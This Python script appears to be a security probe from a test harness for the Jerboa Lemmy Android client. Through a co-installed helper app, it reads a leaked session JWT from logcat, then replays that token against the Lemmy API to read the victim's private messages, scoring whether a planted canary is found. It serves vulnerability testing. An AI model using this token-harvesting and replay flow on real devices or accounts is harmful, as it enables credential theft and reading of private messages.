#!/usr/bin/env python3
"""
Probe: Jerboa — confidentiality (malicious_app).
Leak-to-use flow through a co-installed helper APK.
"""

from __future__ import annotations

import json
import os
import sys
import uuid
from pathlib import Path


def _load_and_run() -> int:
    parent = Path(__file__).resolve().parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_attested_pids,
        get_boot_time,
        get_device_time_info,
        get_dynamic_canary,
        get_victim_jwt_from_db,
        parse_threadtime_epoch,
        parse_threadtime_line,
        run_helper_reproduction,
    )

    summary = {"score": 1, "vectors": {}}
    victim_jwt = get_victim_jwt_from_db()
    if not victim_jwt:
        print(json.dumps({**summary, "error": "missing victim JWT"}))
        return 2

    expected_secret = get_dynamic_canary()
    if not expected_secret:
        print(json.dumps({**summary, "error": "missing dynamic canary"}))
        return 2

    helper_ok, log_output = run_helper_reproduction(
        mode="read_logs",
        logcat_tag="LemmyAPI",
        logcat_pattern=victim_jwt,
        run_id=uuid.uuid4().hex,
    )
    if helper_ok and log_output:
        try:
            attested_pids = get_attested_pids()
            boot_time = get_boot_time()
            year, tzinfo = get_device_time_info()
            leak_line = ""
            for line in reversed(log_output.splitlines()):
                prefix, pid, tag, msg, _ = parse_threadtime_line(line)
                if not pid or pid not in attested_pids:
                    continue
                if tag != "LemmyAPI":
                    continue
                if victim_jwt not in msg and victim_jwt not in line:
                    continue
                if year is not None and tzinfo is not None:
                    epoch = parse_threadtime_epoch(prefix or "", year, tzinfo)
                    if epoch is not None and epoch < boot_time:
                        continue
                leak_line = line
                break

            if leak_line:
                import requests

                base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
                response = requests.get(
                    f"{base_url}/api/v3/private_message/list",
                    params={"type_": "All", "limit": 20},
                    headers={"Authorization": f"Bearer {victim_jwt}"},
                    timeout=10,
                )
                if response.status_code == 200:
                    payload = response.json()
                    for pm in payload.get("private_messages", []):
                        message = pm.get("private_message", {}).get("content", "")
                        if expected_secret and expected_secret in message:
                            summary["vectors"]["V-002"] = True
                            summary["score"] = 0
                            break
        except Exception as exc:
            print(json.dumps({**summary, "error": str(exc)}))
            return 2

    print(json.dumps(summary))
    return 0 if summary["score"] == 0 else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
